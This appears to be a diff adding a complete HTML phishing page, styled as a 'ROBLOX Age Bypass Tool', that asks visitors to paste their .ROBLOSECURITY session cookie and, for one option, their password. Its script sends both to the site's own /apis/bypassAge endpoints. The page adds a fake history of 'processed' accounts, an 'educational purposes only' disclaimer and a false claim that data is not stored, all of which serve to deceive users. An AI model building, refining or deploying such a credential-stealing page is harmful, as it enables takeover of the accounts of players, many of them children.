@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBLOX Account Secure</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #6a11cb;
+            --secondary: #2575fc;
+            --accent: #ff2d75;
+            --dark: #0f172a;
+            --light: #f8fafc;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --card-bg: rgba(15, 23, 42, 0.7);
+            --card-border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            color: var(--light);
+            min-height: 100vh;
+            padding: 15px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 10% 20%, rgba(106, 17, 203, 0.1) 0%, transparent 20%), radial-gradient(circle at 90% 80%, rgba(37, 117, 252, 0.1) 0%, transparent 20%);
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            position: relative;
+        }
+
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 200px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            border-radius: 50%;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .logo-icon {
+            font-size: 2rem;
+            color: var(--accent);
+            background: var(--card-bg);
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            border: 1px solid var(--card-border);
+            box-shadow: 0 0 15px rgba(255, 45, 117, 0.3);
+        }
+
+        .title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            color: #cbd5e1;
+            max-width: 700px;
+            margin: 0 auto 10px;
+            line-height: 1.6;
+        }
+
+        .content-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .main-content {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .history-section {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(5px);
+            border: 1px solid var(--card-border);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .card-title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--light);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-title i {
+            color: var(--accent);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: #e2e8f0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: rgba(15, 23, 42, 0.5);
+            border: 2px solid rgba(37, 117, 252, 0.3);
+            border-radius: 10px;
+            padding: 14px 18px;
+            font-size: 1rem;
+            color: var(--light);
+            font-family: 'Poppins', sans-serif;
+            transition: all 0.3s;
+            outline: none;
+            resize: vertical;
+            min-height: 120px;
+        }
+
+        .select-field {
+            width: 100%;
+            background: rgba(15, 23, 42, 0.5);
+            border: 2px solid rgba(37, 117, 252, 0.3);
+            border-radius: 10px;
+            padding: 14px 18px;
+            font-size: 1rem;
+            color: var(--light);
+            font-family: 'Poppins', sans-serif;
+            transition: all 0.3s;
+            outline: none;
+            margin-bottom: 15px;
+        }
+
+        .select-field:focus {
+            border-color: var(--secondary);
+            box-shadow: 0 0 0 3px rgba(37, 117, 252, 0.2);
+        }
+
+        .password-field {
+            width: 100%;
+            background: rgba(15, 23, 42, 0.5);
+            border: 2px solid rgba(37, 117, 252, 0.3);
+            border-radius: 10px;
+            padding: 14px 18px;
+            font-size: 1rem;
+            color: var(--light);
+            font-family: 'Poppins', sans-serif;
+            transition: all 0.3s;
+            outline: none;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .password-field:focus {
+            border-color: var(--secondary);
+            box-shadow: 0 0 0 3px rgba(37, 117, 252, 0.2);
+        }
+
+        .input-field:focus {
+            border-color: var(--secondary);
+            box-shadow: 0 0 0 3px rgba(37, 117, 252, 0.2);
+        }
+
+        .input-field::placeholder {
+            color: #94a3b8;
+        }
+
+        .process-btn {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 14px 25px;
+            font-size: 1rem;
+            font-weight: 600;
+            font-family: 'Poppins', sans-serif;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .process-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(37, 117, 252, 0.3);
+        }
+
+        .process-btn:active {
+            transform: translateY(1px);
+        }
+
+        .process-btn:disabled {
+            background: linear-gradient(135deg, #3f3f46, #64748b);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .discord-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #5865F2;
+            color: white;
+            text-decoration: none;
+            padding: 12px 20px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 1rem;
+            margin-top: 20px;
+            transition: all 0.3s;
+            width: 100%;
+            box-shadow: 0 4px 10px rgba(88, 101, 242, 0.2);
+        }
+
+        .discord-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(88, 101, 242, 0.3);
+            background: #6a75f1;
+        }
+
+        .info-section {
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(15, 23, 42, 0.4);
+            border-radius: 12px;
+            border-left: 4px solid var(--warning);
+        }
+
+        .info-title {
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            color: var(--warning);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .info-content {
+            line-height: 1.6;
+            color: #cbd5e1;
+            font-size: 0.95rem;
+        }
+
+        .info-content ul {
+            padding-left: 20px;
+            margin: 12px 0;
+        }
+
+        .info-content li {
+            margin-bottom: 8px;
+        }
+
+        .history-list {
+            max-height: 400px;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+
+        .history-item {
+            padding: 12px;
+            background: rgba(15, 23, 42, 0.4);
+            border-radius: 8px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 3px solid var(--secondary);
+            transition: all 0.3s;
+        }
+
+        .history-item:hover {
+            background: rgba(37, 117, 252, 0.1);
+        }
+
+        .history-icon {
+            color: var(--accent);
+            font-size: 1rem;
+        }
+
+        .history-text {
+            font-family: 'Courier New', monospace;
+            color: #cbd5e1;
+            font-size: 0.85rem;
+            word-break: break-all;
+        }
+
+        .history-date {
+            font-size: 0.75rem;
+            color: #94a3b8;
+            margin-top: 4px;
+        }
+
+        .no-history {
+            text-align: center;
+            padding: 20px;
+            color: #94a3b8;
+            font-style: italic;
+        }
+
+        .result-box {
+            display: none;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 10px;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            text-align: center;
+        }
+
+        .result-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--success);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .result-content {
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+
+        /* Toast Notification */
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 1000;
+            transform: translateX(150%);
+            transition: transform 0.4s ease;
+            max-width: 350px;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast-icon {
+            font-size: 1.3rem;
+        }
+
+        .toast-content {
+            line-height: 1.4;
+        }
+
+        .toast-title {
+            font-weight: 600;
+            font-size: 1rem;
+            margin-bottom: 4px;
+        }
+
+        .toast-message {
+            font-size: 0.9rem;
+        }
+
+        /* Responsive Design */
+
+        @media (max-width: 768px) {
+            .title {
+                font-size: 1.8rem;
+            }
+            .subtitle {
+                font-size: 1rem;
+            }
+            .logo-icon {
+                width: 50px;
+                height: 50px;
+                font-size: 1.5rem;
+            }
+            .card-title {
+                font-size: 1.3rem;
+            }
+            .input-field {
+                padding: 12px 15px;
+            }
+            .content-wrapper {
+                flex-direction: column;
+            }
+            .toast {
+                left: 20px;
+                right: 20px;
+                max-width: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .title {
+                font-size: 1.6rem;
+            }
+            .subtitle {
+                font-size: 0.95rem;
+            }
+            .card {
+                padding: 15px;
+            }
+            .card-title {
+                font-size: 1.2rem;
+            }
+        }
+
+        /* Simple animations */
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <div class="logo-icon pulse">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h1 class="title">ROBLOX AGE BYPASS TOOL</h1>
+            </div>
+            <p class="subtitle">Secure your ROBLOX account with advanced bypass techniques for age restrictions</p>
+        </header>
+
+        <div class="content-wrapper">
+            <div class="main-content">
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-key"></i> Account Security Options</h2>
+
+                    <div class="input-group">
+                        <label for="age-option" class="input-label">
+                            <i class="fas fa-user-clock"></i> Select Age Bypass Method
+                        </label>
+                        <select id="age-option" class="select-field">
+                            <option value="">-- Select an option --</option>
+                            <option value="2008">2008 Birthyear Up</option>
+                            <option value="13plus">13+ All Ages</option>
+                        </select>
+
+                        <input id="password-input" class="password-field" type="password" placeholder="Enter account password for verification..." />
+                    </div>
+                    <div id='cookieInput'>
+                        <div class="input-group">
+                            <label for="cookie-input" class="input-label">
+                                <i class="fas fa-cookie"></i> .ROBLOSECURITY Cookie
+                            </label>
+                            <textarea id="cookie-input" class="input-field" placeholder="Paste your .ROBLOSECURITY cookie here..." spellcheck="false"></textarea>
+                        </div>
+
+                        <button id="process-btn" class="process-btn">
+                            <i class="fas fa-cogs"></i> PROCESS ACCOUNT
+                        </button>
+                    </div>
+                    <div id="result-box" class="result-box">
+                        <div class="result-title">
+                            <i class="fas fa-check-circle"></i> Bypass Successful!
+                        </div>
+                        <div class="result-content">
+                            Account age restriction successfully bypassed. New status: <strong>13+</strong>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-section">
+                    <h3 class="info-title"><i class="fas fa-info-circle"></i> Important Information</h3>
+                    <div class="info-content">
+                        <p>Before using this service, please read the following information:</p>
+                        <ul>
+                            <li>This tool is for educational purposes only</li>
+                            <li>Your .ROBLOSECURITY cookie is sensitive information</li>
+                            <li>Choose the appropriate bypass method for your account</li>
+                            <li>Password is required only for 13+ All Ages bypass</li>
+                            <li>Processing may take 5-10 seconds depending on server load</li>
+                            <li>All processed data is encrypted and not stored</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="history-section">
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-history"></i> Latest Processed</h2>
+                    <div class="history-list" id="history-list">
+                        <div class="history-item fade-in">
+                            <i class="fas fa-check-circle history-icon"></i>
+                            <div>
+                                <div class="history-text">2008 Bypass: cookie: a1b2c3d4e5...x9y8z7w6v5</div>
+                                <div class="history-date">Processed: 7/9/2025, 10:30:22 AM</div>
+                            </div>
+                        </div>
+                        <div class="history-item fade-in">
+                            <i class="fas fa-check-circle history-icon"></i>
+                            <div>
+                                <div class="history-text">13+ Bypass: user: player123</div>
+                                <div class="history-date">Processed: 7/9/2025, 9:15:47 AM</div>
+                            </div>
+                        </div>
+                        <div class="history-item fade-in">
+                            <i class="fas fa-check-circle history-icon"></i>
+                            <div>
+                                <div class="history-text">2008 Bypass: cookie: f6g7h8i9j0...a5s4d3f2g1</div>
+                                <div class="history-date">Processed: 7/8/2025, 2:45:13 PM</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast">
+        <i class="fas fa-check-circle toast-icon"></i>
+        <div class="toast-content">
+            <div class="toast-title" id="toast-title">Success!</div>
+            <div class="toast-message" id="toast-message">Account processed successfully</div>
+        </div>
+    </div>
+
+    <script>
+        // DOM elements
+        const ageOption = document.getElementById('age-option');
+        const passwordInput = document.getElementById('password-input');
+        const cookieDiv = document.getElementById('cookieInput');
+        const cookieInput = document.getElementById('cookie-input');
+        const processBtn = document.getElementById('process-btn');
+        const resultBox = document.getElementById('result-box');
+        const toast = document.getElementById('toast');
+        const toastTitle = document.getElementById('toast-title');
+        const toastMessage = document.getElementById('toast-message');
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            // Age option change event
+            cookieDiv.style.display = 'none';
+            processBtn.style.display = 'none';
+            ageOption.addEventListener('change', function() {
+                if (this.value === '13plus') {
+                    passwordInput.style.display = 'block';
+                    cookieDiv.style.display = 'block';
+                    processBtn.style.display = 'block';
+                } else {
+                    passwordInput.style.display = 'none';
+                    cookieDiv.style.display = 'block';
+                    processBtn.style.display = 'block';
+                }
+            });
+
+            function processCookie(cookie) {
+                return new Promise((resolve, reject) => {
+                    $.ajax({
+                        url: '/apis/bypassAge',
+                        method: 'GET',
+                        data: {
+                            a: cookie,
+                        },
+                        dataType: 'json',
+                        success: function(response) {
+                            // Ensure the response has the expected structure
+                            if (response && response.status) {
+                                resolve({
+                                    success: response.status === 'success',
+                                    message: response.message || 'Cookie processed successfully'
+                                });
+                            } else {
+                                resolve({
+                                    success: false,
+                                    message: 'Invalid response format from server'
+                                });
+                            }
+                        },
+                        error: function(xhr, status, error) {
+                            resolve({
+                                success: false,
+                                message: `Request failed: ${error}`
+                            });
+                        }
+                    });
+                });
+            }
+
+            function processCookieV2(cookie, password) {
+                return new Promise((resolve, reject) => {
+                    $.ajax({
+                        url: '/apis/bypassAgeV2',
+                        method: 'GET',
+                        data: {
+                            a: cookie,
+                            b: password,
+                        },
+                        dataType: 'json',
+                        success: function(response) {
+                            // Ensure the response has the expected structure
+                            if (response && response.status) {
+                                resolve({
+                                    success: response.status === 'success',
+                                    message: response.message || 'Cookie processed successfully'
+                                });
+                            } else {
+                                resolve({
+                                    success: false,
+                                    message: 'Invalid response format from server'
+                                });
+                            }
+                        },
+                        error: function(xhr, status, error) {
+                            resolve({
+                                success: false,
+                                message: `Request failed: ${error}`
+                            });
+                        }
+                    });
+                });
+            }
+
+            // Process button click event - FIXED: Added async keyword
+            processBtn.addEventListener('click', async function() {
+                const selectedOption = ageOption.value;
+                const cookie = cookieInput.value.trim();
+
+                // Validate inputs
+                if (!selectedOption) {
+                    showToast('Error', 'Please select an age bypass option', false);
+                    return;
+                }
+
+                if (!cookie) {
+                    showToast('Error', 'Please enter a .ROBLOSECURITY cookie', false);
+                    return;
+                }
+
+                if (selectedOption === '13plus' && !passwordInput.value.trim()) {
+                    showToast('Error', 'Password is required for 13+ bypass', false);
+                    return;
+                }
+
+                // Disable button to prevent spamming
+                processBtn.disabled = true;
+                processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+
+                try {
+                    // Process the cookie via AJAX
+                    const result = await (selectedOption === '13plus' ?
+                        processCookieV2(cookie, passwordInput.value.trim()) :
+                        processCookie(cookie));
+
+                    if (result.success) {
+                        // Add to history - FIXED: Pass selectedOption
+                        addToHistory(selectedOption, cookie);
+                        showToast('Success!', result.message);
+                    } else {
+                        showToast('Error', result.message, false);
+                    }
+                } catch (error) {
+                    console.error('Processing error:', error);
+                    showToast('Error', 'An unexpected error occurred. Please try again.', false);
+                } finally {
+                    // Re-enable button after processing
+                    setTimeout(() => {
+                        processBtn.disabled = false;
+                        processBtn.innerHTML = '<i class="fas fa-cogs"></i> PROCESS COOKIE';
+                    }, 1000);
+                }
+            });
+        });
+
+        // Add to history - FIXED: Improved cookie masking
+        function addToHistory(option, cookie) {
+            const historyList = document.getElementById('history-list');
+            const historyItem = document.createElement('div');
+            historyItem.className = 'history-item fade-in';
+
+            // Improved cookie masking
+            const start = cookie.substring(0, 5);
+            const end = cookie.substring(cookie.length - 5);
+            const maskedCookie = start + '...' + end;
+
+            // Determine method text
+            const methodText = option === '13plus' ? '13+ Bypass' : '2008 Bypass';
+            const displayText = `${methodText}: ${maskedCookie}`;
+
+            historyItem.innerHTML = `
+            <i class="fas fa-check-circle history-icon"></i>
+            <div>
+                <div class="history-text">${displayText}</div>
+                <div class="history-date">Processed: ${new Date().toLocaleString()}</div>
+            </div>
+        `;
+
+            // Add to top of history list
+            historyList.insertBefore(historyItem, historyList.firstChild);
+
+            // Limit to 10 items
+            if (historyList.children.length > 10) {
+                historyList.removeChild(historyList.lastChild);
+            }
+        }
+
+        // Show toast notification (unchanged)
+        function showToast(title, message, isSuccess = true) {
+            toastTitle.textContent = title;
+            toastMessage.textContent = message;
+
+            // Update icon based on success/error
+            const icon = toast.querySelector('.toast-icon');
+            if (isSuccess) {
+                toast.style.background = 'linear-gradient(90deg, var(--primary), var(--secondary))';
+                icon.className = 'fas fa-check-circle toast-icon';
+            } else {
+                toast.style.background = 'linear-gradient(90deg, var(--danger), #f97316)';
+                icon.className = 'fas fa-exclamation-circle toast-icon';
+            }
+
+            toast.classList.add('show');
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 4000);
+        }
+    </script>
+</body>
+
+</html>
